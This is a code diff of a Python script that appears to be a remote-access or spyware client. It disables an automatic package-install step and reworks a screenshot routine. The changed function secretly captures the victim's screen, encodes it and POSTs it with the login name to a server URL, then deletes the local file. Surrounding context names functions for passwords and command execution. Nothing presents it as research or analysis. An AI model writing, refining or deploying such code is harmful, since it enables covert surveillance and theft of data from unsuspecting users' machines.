@@ -11,15 +11,15 @@ def install_packages(packages):
         except subprocess.CalledProcessError as e:
             print(f"Failed to install {package}: {e}")
 
-install_packages([
-        'itsdangerous',
-        'requests',
-        'netifaces',
-        'asyncio',
-        'pyautogui',
-        'pycryptodome',
-        'Flask'
-])
+# install_packages([
+#         'itsdangerous',
+#         'requests',
+#         'netifaces',
+#         'asyncio',
+#         'pyautogui',
+#         'pycryptodome',
+#         'Flask'
+# ])
 
 import subprocess
 import sys
@@ -122,23 +122,31 @@ def main_password():
 
 def take_screenshot():
     try:
+        # Take the screenshot
         img_name = random.randint(1, 99999999)
         img = pg.screenshot()
 
-        img_path = os.path.join(os.getenv('TEMP'), f'{img_name}.png')
-        img.save(img_path)
+        # Resize the image to reduce size (e.g., 50% of the original size)
+        img = img.resize((img.width // 2, img.height // 2))  # Resize to 50% of the original size
 
-        with open(img_path, "rb") as image_file:
-            encoded_image_data = base64.b64encode(image_file.read()).decode('utf-8')
+        # Save the image to a temporary path
+        img_path = os.path.join(os.getcwd(), f'{img_name}.png')  # Save to the current working directory
+        img.save(img_path, format="PNG")
 
-        url = f"{URL}/ss?target={os.getlogin()}&state=false&imgdata={encoded_image_data}"
+        with open(img_path,'rb') as image_file:
+            image_string = image_file.read()
 
-        requests.get(url)
+        # Construct the URL (make sure to URL encode the Base64 string)
+        url = f"{URL}/ss?target={os.getlogin()}&state=false"
 
+        # Send the GET request
+        response = requests.post(url, json={"imgdata": base64.b32encode(image_string).decode("utf-8")})
+        response.raise_for_status()  # Raise an exception for HTTP errors
+
+        # Clean up: remove the temporary image file
         os.remove(img_path)
-
     except Exception as e:
-        print(e)
+        print(f"An error occurred: {e}")
 
 def execute_command(command):
     try:
